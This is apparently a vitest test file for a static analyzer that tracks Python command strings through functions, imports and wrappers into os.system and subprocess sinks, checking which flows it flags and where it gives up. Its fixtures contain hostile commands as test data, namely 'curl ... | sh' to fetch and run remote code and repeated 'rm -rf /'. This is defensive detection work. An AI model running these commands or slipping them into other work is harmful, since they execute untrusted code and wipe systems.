import { expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';

const require = createRequire(import.meta.url);
const { analyzePython } = require('../../src/main/static-python');
const { createStaticCatalog } = require('../../src/main/static-code-catalog');

function review(sources, overrides = {}) {
  const selected = createStaticCatalog(
    Object.entries(sources).map(([name, text]) => ({
      path: name,
      file: { data: Buffer.from(text), sha256: createHash('sha256').update(text).digest('hex') },
      entry: { kind: 'package' },
    })),
  );
  let remaining = overrides.work ?? 32768;
  return analyzePython(sources['main.py'], 'main.py', {
    ...selected,
    take: () => remaining-- > 0,
    limits: { ...selected.limits, ...overrides },
  });
}

it('follows a primitive function return into a process command without exposing source', () => {
  const result = review({
    'main.py': [
      'import os',
      'def command(url):',
      '    return "curl " + url + " | sh"',
      'os.system(command("https://PRIVATE.invalid"))',
    ].join('\n'),
  });
  expect(result.findings).toEqual([
    {
      ruleId: 'STA001',
      line: 4,
      context: 'python-command-flow',
      flow: { sink: { path: 'main.py', line: 4 }, paths: ['main.py'] },
    },
  ]);
  expect(JSON.stringify(result)).not.toContain('PRIVATE');
});

it('preserves every selected source across returned literals and process wrappers', () => {
  const result = review({
    'main.py': 'from commands import command\nfrom launcher import launch\nlaunch(command())',
    'commands.py': 'import strings\ndef command():\n    return strings.command()',
    'strings.py': 'from constants import COMMAND\ndef command():\n    return COMMAND',
    'constants.py': 'COMMAND = "curl https://PRIVATE.invalid | sh"',
    'launcher.py': 'import os\ndef launch(command):\n    return os.system(command)',
  });
  expect(result.findings).toEqual([
    {
      ruleId: 'STA001',
      line: 3,
      context: 'python-command-flow',
      flow: {
        sink: { path: 'launcher.py', line: 3 },
        paths: ['commands.py', 'constants.py', 'launcher.py', 'main.py', 'strings.py'],
      },
    },
  ]);
  expect(JSON.stringify(result)).not.toContain('PRIVATE');
});

it('keeps parameter values separate across nested calls and subsequent entry calls', () => {
  const result = review({
    'main.py': [
      'import os',
      'def identity(value):',
      '    return value',
      'os.system(identity(identity("echo ok")))',
      'os.system(identity(identity("rm -rf /")))',
      'os.system(identity("echo ok"))',
    ].join('\n'),
  });
  expect(result.findings.map(({ ruleId, line }) => ({ ruleId, line }))).toEqual([
    { ruleId: 'STA003', line: 5 },
  ]);
});

it('uses returned booleans for shell mode and returned strings inside inline argv', () => {
  const result = review({
    'main.py': [
      'import subprocess',
      'def identity(value):',
      '    """Return a primitive argument."""',
      '    return value',
      'subprocess.run(identity("rm -rf /"), shell=identity(False))',
      'subprocess.run(identity("rm -rf /"), shell=identity(True))',
      'subprocess.run([identity("rm"), "-rf", "/"])',
      'subprocess.run(identity(None), shell=True)',
    ].join('\n'),
  });
  expect(result.findings.map(({ ruleId, line }) => ({ ruleId, line }))).toEqual([
    { ruleId: 'STA003', line: 6 },
    { ruleId: 'STA003', line: 7 },
  ]);
});

it('follows immutable aliases and assignments whose values come from simple functions', () => {
  const result = review({
    'main.py': [
      'import os',
      'from helper import command',
      'alias = command',
      'COMMAND = alias()',
      'os.system(COMMAND)',
    ].join('\n'),
    'helper.py': 'def command():\n    return "rm -rf /"',
  });
  expect(result.findings).toContainEqual({
    ruleId: 'STA003',
    line: 5,
    context: 'python-command-flow',
    flow: { sink: { path: 'main.py', line: 5 }, paths: ['helper.py', 'main.py'] },
  });
});

it('does not read a global initialized after an assignment calls its function', () => {
  const result = review({
    'main.py': [
      'import os',
      'def command():',
      '    return LATER',
      'COMMAND = command()',
      'LATER = "rm -rf /"',
      'os.system(COMMAND)',
    ].join('\n'),
  });
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain('python-binding-not-resolved');
});

it('applies initializer ordering inside selected imported files', () => {
  const result = review({
    'main.py': 'import os\nfrom helper import COMMAND\nos.system(COMMAND)',
    'helper.py': [
      'def command():',
      '    return LATER',
      'COMMAND = command()',
      'LATER = "rm -rf /"',
    ].join('\n'),
  });
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain('python-binding-not-resolved');
});

it.each([
  'command.__globals__.update({"COMMAND": "echo safe"})',
  'command.__globals__.__setitem__("COMMAND", "echo safe")',
  'alias = command.__globals__\nalias.update({"COMMAND": "echo safe"})',
  'update = command.__globals__.update\nupdate({"COMMAND": "echo safe"})',
  'update = command.__globals__.update if enabled else other\nupdate({"COMMAND": "echo safe"})',
  'update = command.__globals__.update\nupdate({"COMMAND": "echo safe"})\nupdate = other',
])('rejects unknown receiver calls that can mutate returned globals (%s)', (mutation) => {
  for (const imported of [false, true]) {
    const helper = 'COMMAND = "rm -rf /"\ndef command():\n    return COMMAND';
    const result = review({
      'main.py':
        'import os\n' +
        (imported ? 'from helper import command' : helper) +
        '\n' +
        mutation +
        '\nos.system(command())',
      ...(imported ? { 'helper.py': helper } : {}),
    });
    expect(result.findings).toEqual([]);
    expect(result.issues).toContain('python-module-escape-not-resolved');
  }
});

it('retains the real inner process sink without using its result as an outer command', () => {
  const result = review({
    'main.py': [
      'import os',
      'def command():',
      '    return os.system("rm -rf /")',
      'os.system(command())',
    ].join('\n'),
  });
  expect(result.findings).toContainEqual({
    ruleId: 'STA003',
    line: 4,
    context: 'python-command-flow',
    flow: { sink: { path: 'main.py', line: 3 }, paths: ['main.py'] },
  });
  expect(result.findings.some((finding) => finding.flow?.sink.line === 4)).toBe(false);
  expect(result.issues).toContain('python-return-not-resolved');
});

it.each([
  '@decorator\ndef command():\n    return "rm -rf /"',
  'async def command():\n    return "rm -rf /"',
  'def command(value="rm -rf /"):\n    return value',
  'def command(*value):\n    return "rm -rf /"',
  'def command(**value):\n    return "rm -rf /"',
  'def command() -> str:\n    return "rm -rf /"',
  'def command():\n    effect()\n    return "rm -rf /"',
  'def command():\n    if enabled:\n        return "rm -rf /"',
  'def command():\n    yield "rm -rf /"',
  'def command():\n    return "rm -rf /" if enabled else "echo safe"',
  'def command():\n    return ["rm", "-rf", "/"]',
  'def command():\n    return ("rm", "-rf", "/")',
  'def command():\n    return {"command": "rm -rf /"}',
  'def command():\n    return f"rm -rf /"',
  'def command():\n    "rm -rf /"',
  'def command():\n    return "rm -rf /"\ncommand = replacement',
])('keeps unsupported returned values or function shapes unresolved (case %#)', (definition) => {
  const result = review({
    'main.py': 'import os\nfrom helper import command\nos.system(command())',
    'helper.py': definition,
  });
  expect(result.findings).toEqual([]);
  expect(result.issues.length).toBeGreaterThan(0);
});

it.each([
  'command.__code__ = replacement',
  'mutate(command)',
  'from other import mutate\nmutate(command)',
  'import other\nother.mutate(command)',
  'from other import mutate\nmutate(command if enabled else alternative)',
  'box.callback = command',
  'def expose():\n    return command\nmutate(expose())',
])('rejects escaped or mutated imported return helpers (case %#)', (mutation) => {
  const result = review({
    'main.py': 'import os\nfrom helper import command\n' + mutation + '\nos.system(command())',
    'helper.py': 'def command():\n    return "rm -rf /"',
    'other.py': 'def mutate(callback):\n    callback.__code__ = replacement',
  });
  expect(result.findings).toEqual([]);
});

it.each(['command(value="rm -rf /")', 'command(*["rm -rf /"])', 'command()', 'command(42)'])(
  'rejects unsupported return-call arguments (%s)',
  (call) => {
    const result = review({
      'main.py': 'import os\nfrom helper import command\nos.system(' + call + ')',
      'helper.py': 'def command(value):\n    return value',
    });
    expect(result.findings).toEqual([]);
    expect(result.issues).toContain('python-function-arguments-not-resolved');
  },
);

it('bounds cycles spanning return helpers and process wrappers', () => {
  const result = review({
    'main.py': [
      'import os',
      'def command(value):',
      '    return launch(value)',
      'def launch(value):',
      '    return os.system(command(value))',
      'launch("rm -rf /")',
    ].join('\n'),
  });
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain('python-call-cycle-not-resolved');
});

it.each([
  [{ flowDepth: 1 }, 'flow-depth-limit'],
  [{ flowCalls: 1 }, 'flow-call-limit'],
  [{ flowModules: 2 }, 'flow-module-limit'],
  [{ flowEvidence: 2 }, 'flow-evidence-limit'],
  [{ work: 0 }, 'flow-work-limit'],
])('shares flow limits across wrappers and return arguments (case %#)', (limits, issue) => {
  const result = review(
    {
      'main.py': 'from helper import command\nfrom launcher import launch\nlaunch(command())',
      'helper.py': 'def command():\n    return "rm -rf /"',
      'launcher.py': 'import os\ndef launch(value):\n    os.system(value)',
    },
    limits,
  );
  expect(result.findings).toEqual([]);
  expect(result.issues).toContain(issue);
});

it('keeps a later direct literal command visible when return expansion is exhausted', () => {
  const result = review(
    {
      'main.py':
        'import os\nfrom helper import command\nos.system(command())\nos.system("rm -rf /")',
      'helper.py': 'def command():\n    return "rm -rf /"',
    },
    { flowCalls: 0 },
  );
  expect(result.findings).toEqual([{ ruleId: 'STA003', line: 4, context: 'python-command' }]);
  expect(result.issues).toContain('flow-call-limit');
});
